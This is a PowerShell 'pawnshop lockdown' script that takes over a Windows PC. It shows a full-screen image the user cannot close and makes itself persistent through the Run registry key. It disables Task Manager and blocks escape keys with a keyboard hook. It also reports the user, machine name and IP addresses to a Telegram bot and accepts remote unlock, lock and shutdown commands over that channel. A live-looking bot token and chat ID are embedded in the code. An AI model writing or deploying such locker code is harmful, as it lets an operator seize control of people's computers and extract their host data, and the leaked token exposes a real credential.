# =======================
# Pawnshop Lockdown Script v2.0
# -----------------------
# Blocks PC with fullscreen image + remote control via Telegram
# Author: Codrut + ChatGPT
# =======================

# --- CONFIGURATION ---
$imageURL = "https://raw.githubusercontent.com/diezul/x/main/1.png"             # Fullscreen image shown when PC is locked
$tempImagePath = "$env:TEMP\lockscreen.jpg"                                    # Local temp file for the image
$botToken = "7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co"                     # Telegram Bot Token
$chatID = "656189986"                                                             # Authorized Chat ID (your Telegram ID)
$pc = $env:COMPUTERNAME                                                           # PC Name
$user = $env:USERNAME                                                             # Windows Username
$lockFile = "C:\\lock_status.txt"                                                # Lock status file to store "locked" or "unlocked"
$unlockCommand = "/unlock$user"
$lockCommand = "/lock$user"
$shutdownCommand = "/shutdown$user"
$script:AllowClose = $false                                                      # Prevent form from closing normally

# --- STATE CHECK ---
if (Test-Path $lockFile) {
    $state = Get-Content $lockFile -ErrorAction SilentlyContinue
    if ($state -eq "unlocked") { return }   # Don't lock if explicitly unlocked
} else {
    "locked" | Out-File $lockFile -Force
}

# --- AUTOSTART REGISTRY ENTRY ---
$RunKey = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
$RunValueName = "PawnShopLock"
if ($MyInvocation.MyCommand.Path) {
    $startCmd = "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`""
    Set-ItemProperty -Path $RunKey -Name $RunValueName -Value $startCmd -Force
}

# --- DISABLE TASK MANAGER ---
New-Item "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Force | Out-Null
Set-ItemProperty "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name "DisableTaskMgr" -Value 1 -Force

# --- DOWNLOAD FULLSCREEN IMAGE ---
Invoke-WebRequest -Uri $imageURL -OutFile $tempImagePath -UseBasicParsing

# --- TELEGRAM NOTIFICATION ---
try {
    $ipLocal = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notmatch '^127|169' })[0].IPAddress
} catch { $ipLocal = "n/a" }
try { $ipPublic = Invoke-RestMethod "https://api.ipify.org" } catch { $ipPublic = "n/a" }
$message = "🔒 Pawnshop PC Locked:`nUser: $user`nPC: $pc`nLocal IP: $ipLocal`nPublic IP: $ipPublic`nCommands:`n$unlockCommand`n$lockCommand`n$shutdownCommand"
Invoke-RestMethod "https://api.telegram.org/bot$botToken/sendMessage" -Method POST -Body (@{ chat_id = $chatID; text = $message } | ConvertTo-Json) -ContentType 'application/json'

# --- KEYBOARD BLOCKING HOOK ---
Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;
public class KeyBlocker {
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100, WM_SYSKEYDOWN = 0x0104;
    private static IntPtr hook = IntPtr.Zero;
    private static LowLevelKeyboardProc proc = Hook;
    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
    [DllImport("user32.dll")] static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc proc, IntPtr hMod, uint threadId);
    [DllImport("user32.dll")] static extern bool UnhookWindowsHookEx(IntPtr hhk);
    [DllImport("user32.dll")] static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
    [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string name);
    public static void Block() {
        hook = SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(null), 0);
    }
    public static void Unblock() {
        UnhookWindowsHookEx(hook);
    }
    private static IntPtr Hook(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0) {
            int vkCode = Marshal.ReadInt32(lParam);
            Keys key = (Keys)vkCode;
            if ((Control.ModifierKeys.HasFlag(Keys.Alt) && key == Keys.F4) ||
                key == Keys.LWin || key == Keys.RWin ||
                (Control.ModifierKeys.HasFlag(Keys.Alt) && key == Keys.Tab) ||
                (Control.ModifierKeys.HasFlag(Keys.Control) && key == Keys.Escape) ||
                key == Keys.Tab) {
                return (IntPtr)1; // Block
            }
            if (key == Keys.C) Environment.Exit(0); // Manual override
        }
        return CallNextHookEx(hook, nCode, wParam, lParam);
    }
}
"@
[KeyBlocker]::Block()

# --- SHOW IMAGE FULLSCREEN ON ALL MONITORS ---
Add-Type -AssemblyName System.Windows.Forms, System.Drawing
$forms = foreach ($screen in [System.Windows.Forms.Screen]::AllScreens) {
    $form = New-Object Windows.Forms.Form -Property @{
        FormBorderStyle = 'None'; WindowState = 'Maximized'; StartPosition = 'Manual'; TopMost = $true;
        Bounds = $screen.Bounds; KeyPreview = $true; ShowInTaskbar = $false; Cursor = [Windows.Forms.Cursors]::None
    }
    $form.Add_FormClosing({ if (-not $script:AllowClose) { $_.Cancel = $true } })
    $pb = New-Object Windows.Forms.PictureBox -Property @{ Image = [System.Drawing.Image]::FromFile($tempImagePath); Dock = 'Fill'; SizeMode = 'Zoom' }
    $form.Controls.Add($pb); $form.Show(); $form
}

# --- TELEGRAM LISTENER (Every 3 sec) ---
$offset = 0
try {
    $init = Invoke-RestMethod "https://api.telegram.org/bot$botToken/getUpdates"
    if ($init.result.Count -gt 0) { $offset = ($init.result | Select-Object -Last 1).update_id + 1 }
} catch {}

$timer = New-Object Windows.Forms.Timer
$timer.Interval = 3000
$timer.Add_Tick({
    try {
        $updates = Invoke-RestMethod "https://api.telegram.org/bot$botToken/getUpdates?offset=$offset"
        foreach ($u in $updates.result) {
            $offset = $u.update_id + 1
            $txt = $u.message.text.ToLower()
            if ($txt -eq $unlockCommand.ToLower()) {
                "unlocked" | Out-File $lockFile -Force
                Remove-ItemProperty -Path $RunKey -Name $RunValueName -ErrorAction SilentlyContinue
                Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name "DisableTaskMgr" -Value 0 -Force
                $script:AllowClose = $true
                [System.Windows.Forms.Application]::Exit()
            } elseif ($txt -eq $lockCommand.ToLower()) {
                "locked" | Out-File $lockFile -Force
                Set-ItemProperty -Path $RunKey -Name $RunValueName -Value $startCmd -Force
            } elseif ($txt -eq $shutdownCommand.ToLower()) {
                Remove-ItemProperty -Path $RunKey -Name $RunValueName -ErrorAction SilentlyContinue
                Stop-Computer -Force
            }
        }
    } catch {}
})
$timer.Start()

# --- MAIN LOOP ---
[System.Windows.Forms.Application]::Run()

# --- CLEANUP ON EXIT ---
$timer.Stop()
[KeyBlocker]::Unblock()
Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name "DisableTaskMgr" -Value 0 -Force
